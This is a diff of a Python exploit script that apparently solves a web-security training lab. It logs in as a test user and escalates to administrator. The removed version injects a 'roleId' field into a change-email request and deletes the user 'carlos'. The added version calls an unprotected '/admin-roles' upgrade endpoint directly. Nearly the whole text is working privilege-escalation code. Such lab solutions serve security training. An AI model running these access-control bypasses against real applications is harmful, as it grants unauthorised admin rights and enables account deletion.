@@ -22,43 +22,32 @@ headers = {
 def login_acc(s, url, username, password):
     login_url = url + '/login'
     payload = {
-        'username': username,
-        'password': password,
+        "username": username,
+        "password": password
     }
     r = s.post(login_url, data=payload, headers=headers)
 
     if 'Log out' in r.text:
-        print(f'[+] Logged in {username} account')
+        print(f'[+] Successful login {username} account')
     else:
-        print(f'[-] Fail to log in {username} account')
+        print(f'[-] Fail to login {username} account')
         sys.exit(-1)
 
-def addRoleId(s, url):
-    update_mail_url = url + '/my-account/change-email'
-    payload = {
-        "email": 'test@gmail.com',
-        "roleId": 2
-    }
-    r = s.post(update_mail_url, data=json.dumps(payload), headers=headers)
+def upgrade_role(s, url, path):
+    target_url = url + path
+    r = s.get(target_url)
 
     if 'Admin panel' in r.text and r.status_code == 200:
-        print('[+] Success add role id')
+        print(f'[+] Successful upgrade user role to admin')
     else:
-        print('[-] Fail to add role id')
-        sys.exit(-1)
+        print('[-] Fail to upgrade user role')
 
-
-def delete_acc(s, url, username, cookie = None):
-    delete_url = url + '/admin/delete'
-    payload = { 'username': username }
-    cookie = None
-    r = s.get(delete_url, data=payload, cookies=cookie, headers=headers)
-
-    if 'User deleted successfully!' in r.text:
-        print('[+] Successful solved lab')
-    else:
-        print('[-] Fail to exploit lab')
-        sys.exit(-1)
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+    print('[-] Fail to exploit lab')
 
 def main():
     if len(sys.argv) != 2:
@@ -69,9 +58,9 @@ def main():
     s = requests.Session()
     url = sys.argv[1]
 
-    login_acc(s, url, username='wiener', password='peter')
-    addRoleId(s, url)
-    delete_acc(s, url, username='carlos')
+    login_acc(s, url, 'wiener', 'peter')
+    upgrade_role(s, url, '/admin-roles?username=wiener&action=upgrade')
+    check_solved_lab(s, url)
     
 
 if __name__ == '__main__':
